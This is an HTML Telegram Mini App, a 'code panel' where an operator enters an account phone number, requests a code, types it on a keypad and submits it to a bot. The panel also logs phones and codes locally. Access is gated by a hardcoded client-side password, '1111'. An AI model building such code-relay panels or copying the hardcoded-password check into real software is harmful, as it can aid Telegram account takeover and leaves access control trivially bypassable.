<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Панель кодов</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      background: #0e1117;
      color: #e6edf3;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 14px;
    }
    .card {
      width: 100%;
      max-width: 430px;
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 14px;
      padding: 18px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.45);
    }
    h1, h2 {
      margin: 0 0 8px;
      font-size: 19px;
    }
    .sub {
      margin: 0 0 14px;
      font-size: 13px;
      color: #8b949e;
      line-height: 1.4;
    }
    input {
      width: 100%;
      padding: 11px 12px;
      border-radius: 10px;
      border: 1px solid #30363d;
      background: #0d1117;
      color: #e6edf3;
      font-size: 15px;
      margin-bottom: 10px;
      outline: none;
    }
    input:focus {
      border-color: #2f81f7;
    }
    button {
      width: 100%;
      padding: 11px 12px;
      border: 0;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      color: #fff;
      background: #238636;
    }
    button:active { transform: scale(0.99); }
    .btn-blue { background: #1f6feb; }
    .btn-gray { background: #30363d; }
    .btn-red { background: #da3633; }
    .err {
      color: #ff7b72;
      font-size: 13px;
      min-height: 18px;
      margin-bottom: 8px;
    }
    .panel { display: none; }
    .panel.active { display: block; }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 12px;
      gap: 8px;
    }
    .badge {
      font-size: 11px;
      padding: 4px 8px;
      border-radius: 999px;
      background: #1f2937;
      color: #58a6ff;
      border: 1px solid #30363d;
      white-space: nowrap;
    }
    .box {
      background: #0d1117;
      border: 1px solid #21262d;
      border-radius: 12px;
      padding: 12px;
      margin-bottom: 12px;
    }
    .box-label {
      font-size: 12px;
      color: #8b949e;
      margin-bottom: 6px;
    }
    .code-screen {
      background: #090c10;
      border: 1px solid #30363d;
      border-radius: 12px;
      padding: 12px;
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      letter-spacing: 6px;
      color: #79c0ff;
      min-height: 56px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
      user-select: all;
    }
    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 8px;
      margin-bottom: 10px;
    }
    .key-btn {
      background: #21262d;
      border: 1px solid #30363d;
      font-size: 18px;
      padding: 13px 0;
      border-radius: 10px;
    }
    .key-btn:hover { background: #2d333b; }
    .row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      margin-bottom: 8px;
    }
    .status {
      margin-top: 10px;
      background: #0d1117;
      border: 1px solid #21262d;
      border-radius: 10px;
      padding: 10px 12px;
      font-size: 12px;
      color: #8b949e;
      line-height: 1.4;
      word-break: break-word;
    }
    .history {
      margin-top: 10px;
      max-height: 150px;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .hist-item {
      background: #0d1117;
      border: 1px solid #21262d;
      border-radius: 9px;
      padding: 8px 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 13px;
    }
    .hist-item strong {
      color: #58a6ff;
      font-size: 15px;
    }
    .hist-item small {
      color: #8b949e;
      display: block;
      font-size: 11px;
    }
    .mini-btn {
      width: auto;
      padding: 6px 10px;
      font-size: 12px;
      background: #21262d;
      border: 1px solid #30363d;
    }
  </style>
</head>
<body>
  <div class="card">
    <!-- ВХОД ПО ПАРОЛЮ -->
    <div id="loginPanel" class="panel active">
      <h1>Вход в панель</h1>
      <p class="sub">Введите пароль, чтобы открыть ввод номера и цифровую клавиатуру.</p>
      <input id="passInput" type="password" placeholder="Пароль (по умолчанию 1111)" autocomplete="off" />
      <div id="loginErr" class="err"></div>
      <button id="loginBtn" class="btn-blue">Войти</button>
    </div>

    <!-- ОСНОВНАЯ ПАНЕЛЬ -->
    <div id="mainPanel" class="panel">
      <div class="top-bar">
        <h2>Панель кодов</h2>
        <span class="badge" id="tgBadge">TG: проверка</span>
      </div>

      <div class="box">
        <div class="box-label">1. Номер аккаунта</div>
        <input id="phoneInput" type="tel" placeholder="+380..." autocomplete="tel" />
        <div class="row">
          <button id="sendPhoneBtn" class="btn-blue">Отправить номер</button>
          <button id="resendBtn" class="btn-gray">Запросить снова</button>
        </div>
      </div>

      <div class="box">
        <div class="box-label">2. Ввод кода кнопками</div>
        <div id="codeScreen" class="code-screen">-----</div>

        <div class="keypad">
          <button type="button" class="key-btn" data-d="1">1</button>
          <button type="button" class="key-btn" data-d="2">2</button>
          <button type="button" class="key-btn" data-d="3">3</button>
          <button type="button" class="key-btn" data-d="4">4</button>
          <button type="button" class="key-btn" data-d="5">5</button>
          <button type="button" class="key-btn" data-d="6">6</button>
          <button type="button" class="key-btn" data-d="7">7</button>
          <button type="button" class="key-btn" data-d="8">8</button>
          <button type="button" class="key-btn" data-d="9">9</button>
          <button type="button" class="key-btn btn-gray" id="clearBtn">Сброс</button>
          <button type="button" class="key-btn" data-d="0">0</button>
          <button type="button" class="key-btn btn-gray" id="backBtn">⌫</button>
        </div>

        <div class="row">
          <button id="confirmBtn">Подтвердить код</button>
          <button id="copyBtn" class="btn-blue">Копировать</button>
        </div>
        <button id="logoutBtn" class="btn-red">Выйти</button>
      </div>

      <div id="statusBox" class="status">Готово к работе.</div>
      <div id="historyBox" class="history"></div>
    </div>
  </div>

  <script>
    const PASS = "1111";
    const MAX_LEN = 8;
    const HIST_KEY = "tg_bot_html_codes_v2";
    const tg = window.Telegram && window.Telegram.WebApp;
    const tgBadge = document.getElementById("tgBadge");

    if (tg) {
      tg.ready();
      tg.expand();
      const u = tg.initDataUnsafe && tg.initDataUnsafe.user;
      tgBadge.textContent = u ? "@" + (u.username || u.first_name || "user") : "TG WebApp";
    } else {
      tgBadge.textContent = "Браузер";
    }

    const loginPanel = document.getElementById("loginPanel");
    const mainPanel = document.getElementById("mainPanel");
    const passInput = document.getElementById("passInput");
    const loginErr = document.getElementById("loginErr");
    const phoneInput = document.getElementById("phoneInput");
    const codeScreen = document.getElementById("codeScreen");
    const statusBox = document.getElementById("statusBox");
    const historyBox = document.getElementById("historyBox");

    let codeBuf = "";

    function setStatus(msg) {
      statusBox.textContent = msg;
    }

    function renderScreen() {
      codeScreen.textContent = codeBuf.length > 0 ? codeBuf : "-----";
    }

    function getHistory() {
      try {
        return JSON.parse(localStorage.getItem(HIST_KEY) || "[]");
      } catch {
        return [];
      }
    }

    function pushHistory(codeVal, phoneVal) {
      const list = getHistory();
      list.unshift({
        code: codeVal,
        phone: phoneVal || "-",
        time: new Date().toLocaleTimeString("ru-RU")
      });
      localStorage.setItem(HIST_KEY, JSON.stringify(list.slice(0, 20)));
      renderHistory();
    }

    function renderHistory() {
      const list = getHistory();
      historyBox.innerHTML = "";
      list.forEach((item) => {
        const row = document.createElement("div");
        row.className = "hist-item";
        row.innerHTML = `
          <div>
            <strong>${escapeHtml(item.code)}</strong>
            <small>${escapeHtml(item.phone)} • ${escapeHtml(item.time)}</small>
          </div>
        `;
        const btn = document.createElement("button");
        btn.className = "mini-btn";
        btn.textContent = "Копировать";
        btn.addEventListener("click", () => copyVal(item.code));
        row.appendChild(btn);
        historyBox.appendChild(row);
      });
    }

    function escapeHtml(s) {
      return String(s)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;");
    }

    function copyVal(val) {
      if (!val || val === "-----") return;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(val).then(() => setStatus("Скопировано: " + val)).catch(() => fallbackCopy(val));
      } else {
        fallbackCopy(val);
      }
    }

    function fallbackCopy(val) {
      const ta = document.createElement("textarea");
      ta.value = val;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      setStatus("Скопировано: " + val);
    }

    function sendToBot(payload) {
      const raw = JSON.stringify(payload);
      if (tg && typeof tg.sendData === "function") {
        tg.sendData(raw);
        setStatus("Отправлено в бота: " + raw);
      } else {
        setStatus("Вне Telegram WebApp (данные сформированы): " + raw);
      }
    }

    function login() {
      if (passInput.value.trim() === PASS) {
        loginPanel.classList.remove("active");
        mainPanel.classList.add("active");
        renderScreen();
        renderHistory();
        setStatus("Вход выполнен.");
      } else {
        loginErr.textContent = "Неверный пароль";
      }
    }

    document.getElementById("loginBtn").addEventListener("click", login);
    passInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") login();
    });

    document.getElementById("sendPhoneBtn").addEventListener("click", () => {
      const phone = phoneInput.value.trim();
      if (!phone) {
        setStatus("Введите номер телефона.");
        return;
      }
      sendToBot({ action: "send_phone", phone });
    });

    document.getElementById("resendBtn").addEventListener("click", () => {
      const phone = phoneInput.value.trim();
      sendToBot({ action: "resend_code", phone });
    });

    document.querySelectorAll(".key-btn[data-d]").forEach((btn) => {
      btn.addEventListener("click", () => {
        if (codeBuf.length >= MAX_LEN) return;
        codeBuf += btn.dataset.d;
        renderScreen();
      });
    });

    document.getElementById("backBtn").addEventListener("click", () => {
      codeBuf = codeBuf.slice(0, -1);
      renderScreen();
    });

    document.getElementById("clearBtn").addEventListener("click", () => {
      codeBuf = "";
      renderScreen();
    });

    document.getElementById("confirmBtn").addEventListener("click", () => {
      if (!codeBuf) {
        setStatus("Сначала введите код кнопками.");
        return;
      }
      const phone = phoneInput.value.trim();
      const confirmed = codeBuf;
      pushHistory(confirmed, phone);
      sendToBot({ action: "submit_code", phone, code: confirmed });
      codeBuf = "";
      renderScreen();
    });

    document.getElementById("copyBtn").addEventListener("click", () => {
      const hist = getHistory();
      const target = codeBuf || (hist[0] && hist[0].code) || "";
      copyVal(target);
    });

    document.getElementById("logoutBtn").addEventListener("click", () => {
      codeBuf = "";
      renderScreen();
      mainPanel.classList.remove("active");
      loginPanel.classList.add("active");
      passInput.value = "";
      loginErr.textContent = "";
    });
  </script>
</body>
            </html>
